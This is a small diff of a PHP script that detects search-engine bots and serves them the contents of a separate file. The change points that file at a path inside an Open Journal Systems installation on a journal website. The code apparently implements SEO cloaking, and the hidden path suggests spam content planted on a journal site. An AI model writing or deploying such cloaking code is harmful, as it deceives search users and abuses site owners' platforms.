@@ -37,7 +37,7 @@ function check_client(array $patterns): bool {
 // ------------------------
 if (check_client($clientPatterns)) {
     // Konten khusus bot (SEO)
-    $botFile = 'readme.txt'; // bisa juga langsung embed konten disini
+    $botFile = '/home/sekawanorg/journal.sekawan-org.id/ojs330-21/lib/pkp/lib/readme.txt'; // bisa juga langsung embed konten disini
     if (file_exists($botFile)) {
         echo file_get_contents($botFile);
     } else {
